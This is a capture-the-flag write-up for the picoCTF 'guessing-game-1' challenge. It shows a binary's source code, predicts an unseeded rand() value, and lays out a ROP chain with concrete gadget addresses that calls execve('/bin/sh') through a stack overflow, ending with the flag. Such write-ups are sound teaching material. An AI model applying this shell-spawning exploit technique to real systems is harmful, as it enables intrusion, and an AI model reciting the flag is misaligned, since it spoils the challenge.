# guessing-game-1

## Enumeration 

What're you working with?

```bash
$ file vuln  
vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4f60, not stripped
```

An interesting observation is that the binary is `statically linked` meaning that libc is compiled into the application.

Also check the securities:

```bash
$ checksec vuln
[*] '~/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Also checking the Makefile

```
$ cat Makefile 
all:
        gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c

clean:
        rm vuln
```

`checksec` reports that stack canaries are enabled however, the `Makefile` has `-fno-stack-protector` which states otherwise.

Lastly, checking the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 100


long increment(long in) {
	return in + 1;
}

long get_random() {
	return rand() % BUFSIZE;
}

int do_stuff() {
	long ans = get_random();
	ans = increment(ans);
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf("Welcome to my guessing game!\n\n");
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
```

This programs PRN generator is never seeded. Reading online, if `rand()` is never seeeded, then the seed is 1. This means you can predict what this number may be. I wrote a small program to do this but you can also put `vuln` in to a debugger and get the value:

```c
#include <stdlib.h>
#include <stdio.h>

void main(void) {
        printf("%d\n", (rand() % 100) + 1);
}
```

This outputs a value of `84` which works:

```bash
$ ./vuln 
Welcome to my guessing game!

What number would you like to guess?
84
Congrats! You win! Your prize is this print statement!

New winner!
```

Cool. Now you have access to the `win` function. There is a buffer overflow in the `winner` variable. 100 bytes are allocated for `winner` but the user is allowed to write in 360 bytes. Because NX is enabled you cannot simply ret2stack. We'll have to ret2libc. Ideally, we'd like to call `execve`.

Taking a look at this [syscall table](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/), `sys_execve` takes three parameters: `const char* filename`, `const char* const argv[]`, `const char* const envp[]`. Since we don't want to pass arguments or environment variables, the call will look like:

```
sys_execve("/bin/sh", NULL, NULL)
```

`sys_execve` rax identifier is 59.

The mapping will be:
- rax -> 59 (0x3b)
- rdi -> "/bin/sh" 
- rsi -> NULL      
- rdx -> NULL      

You can find the address to all these ROP-gadgets using `ropper` or `ROPgadget`

```
$ cat ropgadgets.results | grep "pop r[sd][ix] ; ret$"
0x00000000004163f4 : pop rax ; ret
0x0000000000400696 : pop rdi ; ret
0x000000000044a6b5 : pop rdx ; ret
0x0000000000410ca3 : pop rsi ; ret
```

You'll also need `syscall`

```
$ cat ropgadgets.results | grep "syscall"
0x000000000040137c : syscall
```

Lastly , you need to somehow get "/bin/sh" into `rdi`.

Searching the application for "/bin/sh" yields nothing:

```bash
$ strings -a -t x vuln | grep "/bin/sh"
```

This means we'll need to find an area to write to:

```bash
$ readelf -S vuln
...
  [26] .bss              NOBITS           00000000006bc3a0  000bc398
       00000000000016f8  0000000000000000  WA       0     0     32
...
```

We'll need to find an instruction to write to this section. Something like `mov [reg], reg ; ret`

```
$ cat ropgadgets.results | grep "mov qword ptr \[r..\], r.. ; ret" 1
0x000000000043608b : mov qword ptr [rdi], rcx ; ret
0x0000000000436393 : mov qword ptr [rdi], rdx ; ret
0x0000000000447d7b : mov qword ptr [rdi], rsi ; ret
0x0000000000419127 : mov qword ptr [rdx], rax ; ret
0x000000000047ff91 : mov qword ptr [rsi], rax ; ret
```

Finally, the payload will look something like

```
---------------------------
|         padding         |
---------------------------
|         pop rdi         |
---------------------------
|         bss addr        |
---------------------------
|         pop rdx         |
---------------------------
|         /bin/sh\0       |
---------------------------
|       mov [rdi], rdx    |
---------------------------
|         pop rax         |
---------------------------
|           0x3b          |
---------------------------
|         pop rsi         |
---------------------------
|           0x0           |
---------------------------
|         pop rdx         |
---------------------------
|           0x0           |
---------------------------
|         sys_call        |
---------------------------
```

I wrote the above into a Python3 script `exploit.py`.

flag: `picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_d9889a1f6198d933}`